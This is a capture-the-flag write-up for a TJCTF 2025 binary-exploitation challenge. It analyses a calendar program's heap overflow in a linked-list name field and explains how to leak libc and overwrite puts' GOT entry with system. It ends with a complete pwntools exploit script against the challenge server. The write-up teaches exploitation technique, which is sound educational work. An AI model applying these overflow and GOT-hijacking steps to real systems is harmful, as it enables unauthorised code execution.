### reading source code :

we were provided source code for this challenge , let's analyse it's main components :

- _main function_

```c
int main() {
    char inputBuffer[256] = {'\0'};
    struct eventList events;
    events.head = malloc(sizeof(struct event));
    events.head->next = NULL;
    events.head->time = 0;
    events.size = 1;

    setbuf(stdout, NULL);

    for (int i = 0; i < 2; i++) {
        puts("Add an event to your calendar:");

        struct event *cur = events.head;
        while (cur->next != NULL) {
            cur = cur->next;
        }
        cur->next = malloc(sizeof(struct event));
        cur->next->next = NULL;
        cur->next->time = 0;
        events.size++;

        printf("Event time? (1-24) ");
        fgets(inputBuffer, sizeof(inputBuffer), stdin);
        int t = atoi(inputBuffer);
        if (t == 0) {
            free(cur->next);
            cur->next = NULL;
            events.size--;
            printf("Invalid integer: %s\n", inputBuffer);
            continue;
        }
        cur->time = t;

        printf("Event name? ");
        fgets(inputBuffer, sizeof(inputBuffer), stdin);
        inpcpy(cur->name, inputBuffer);

        displayEvents(&events);
    }

    puts("2 events and still couldn't get the flag?");
    puts("smhmh");
    puts("just run like...");
    puts("cat flag.txt");
    puts("or something like that");
    return 0;
}
```

looks like we're going in a loop that has 2 iterations , in each iteration we're gonna

1. allocate a struct of type `event`
2. fill this `event` object elements , maybe directly from our input or by using the `incpy` function
3. display the event objects created previously
   again this is just a speculation so lets dive into the rest of the code

- _event struct and head_ :

```c
struct event {
    int time;
    char name[128];
    struct event *next;
};

struct eventList {
    int size;
    struct event *head;
};
```

1. our `event` struct looks like a typical `singly linked list` data structure , with int time and string name as it's elements , and next being a pointer to the next `event` object in the list
2. `eventList` is also a typical linked list head , storing the number of the linked list nodes (also called objects) and the head node .

- _incpy()_:

```c
void inpcpy(char *dst, char *src) {
    int ind = 0;
    while (src[ind] != '\n') {
        dst[ind] = src[ind];
        ind++;
    }
}
```

this function is a simple `copy until you receive a newline` , very sussy and dangerous function that doesnt take into its parameters any hint about how many bytes you should copy from src to dst , so this will most probably result in a BOF .

- _displayEvents()_

```c
void displayEvents(struct eventList *events) {
    puts("Calendar events:");

    struct event *cur = events->head;
    for (int i = 0; i < events->size; i++) {
        if (cur->time == 0) {
            break;
        }
        printf("%u:00 - %s\n", cur->time, cur->name);
        cur = cur->next;
    }
    printf("\n\n");
}
```

this function prints the time (int) and the name (string) of each `event` object in our linked list .

### understanding source code :

now that we have somewhat of an idea about the source code , lets reread the main function to understand each line of it .

1. before the loop (usually setup) , we declare a head for our linked list in the variable `events` , and we immediatly allocate a node (`event` object) and we assign the head of the linked list to it
2. what happens in each iteration of the loop ?

   1. we go to last element in the linked list by navugating the next pointer until we reach an object where ``next==null` , in other words no next element

   ```c
   struct event *cur = events.head;
       while (cur->next != NULL) {
           cur = cur->next;
       }

   ```

   2. we allocate a new node and set it to the last node , so the node we'll be interacting with will be the one allocated in setup for the first iteration , and the one allocated in first iteration for the second iteration
   3. read a valid time integer into it , otherwise it skips this iteration
   4. then we read a name into this stack variable `char inputBuffer[256]` with the its correct size byu using `sizeof(inputBuffer)` . this means there is no overflow right ? right this moment i asked myself these 2 questions .

   - our input isn't directly read into our allocated node , its read into a stack variable . so there must a copy function used to later copy our input read from this stack variable to our node . looking a little bit further , turns out to be the `incpy` function
   - is the size read (in our case 256) the same as the true size of the `name string` of our node allocated ? looking at `char name[128];` in the struct definition immediatly answers our suspicion . and the answer is no , it's much smaller than i thought (thats what she said) .
   - so combining our 2 questions and their answers , we get this conclusion .

   #### we are reading a 256 byte string then we gonna copy that string into a 128 byte string until we encounter a newline >>> OVERFLOW

    <div style="text-align: center;">
    <img src="/assets/images/hacker.jpg" alt="hacker" style="width: 500px; height: auto;" />
    </div>

3. the last part after was just some random messages printed with puts . BUT this looks very suspicous
   ```c
   puts("cat flag.txt");
   ```
   if you've wasted enough time from your life on pwn , you'd probably noticed that this might be a time saviour , as overwriting the puts _GOT entry_ with system would be GG , and we wont need the casual system("/bin/sh") that would require more setup and work . we will try to go for this approach , if you have no idea about got hijacking , these are for you [link1](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got) [link2](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) .

### strategy and exploitation :

so we got our buffer overflow in the name variable , what can we do with it ?
notice first that our file has `PIE` off

```bash
$ checksec --file=main
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

this means that we know the addresses of the executable .
so our plan is this

- get libc leak , so that way we can calculate addr of `system`
- overwrite `Puts GOT entry` with `system` .
- when `puts("cat flag.txt");` gets called , what gets executed is this `system("cat flag.txt");`

what you need to remember :

- we have two iteration in our for loop so we'll try to do each step in an iteration
- we have a function that displays names from nodes
- we know the GOT entry addresses of all functions as PIE is off

small note : the program always allocates a blank node in our linked list , so the node we'll be reading into , isnt the last one but the one before , so the layout in memory will be something similar

-------------------------the node we're reading into-------------------

------------------- time: int

------------------- name : string

------------------- name : string

------------------- name : string

------------------- name : string

------------------- next1 : pointer

-------------------------blank node -------------------

------------------- time: int

------------------- name : string

------------------- name : string

------------------- name : string

------------------- name : string

------------------- next2 : pointer

what are the good targets that we can overwrite using this bof ? :

- name of the blank node ? useless . no
- next2 ? good start but no
- heap metadata ? we dont have much control over the program so most probably no
- next1 ? took some time but yeah . why ? suppose we overwrite it with address X . X will be the last node of the linked list instead of that blank node .
  and it's contents will be printed , the first 4 bytes as int `("%d")` and the next bytes as string `("%s")` , why in normal case wasnt that blank node printed ?
  in fact it was trying to be printed , but as its `time` is 0 , it fails on this check

  ```c
  if (cur->time == 0) {
          break;
      }
  ```

this gives us a very good read primitive , imagine `X =&GOT_Puts -4 ` , then the name attribue will be &GOT_puts and it will print the &Puts from libc . this would be clean but look at this

![img](/assets/posts/TJCTF-2025/image.png)

time would be the second half of `GOT_free` which is zero because the function was never called yet , so its address was still a plt entry .

so our approach should be `X =&GOT_Puts` , have the first bytes be leaked as int , and second half as raw bytes

![img](/assets/posts/TJCTF-2025/leak.png)

this would also grant us arbitrary write on this chunk , given what i explained in _understanding source code_ , in the next iteration , the chunk we'll be dealing with is the latest chunk , in other words X .

so again we write its first 4 bytes as int (in time attribute) , and the latter 4 bytes as string (in name attribute)

### solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main_patched")
libc=ELF("./libc.so.6")
nc="nc tjc.tf 31509"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
p.recvuntil("Event time? (1-24)")
p.sendline("1")
debug()
p.recvuntil("Event name? ")
p.sendline(b"a"*0x84+p64(exe.got.puts))
p.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08@@\n")
libc.address=int(p.recvuntil(b":")[:-1])
p.recvuntil(b"- ")
libc.address=libc.address | (u16(p.recv(2))<<32)
libc.address-=0x87be0
log.info(hex(libc.address))

p.recvuntil("Event time? (1-24)")
p.sendline(str(libc.symbols.system&0xffffffff))
p.recvuntil("Event name? ")
p.sendline(p32(libc.symbols.system>>32))

p.interactive()
```
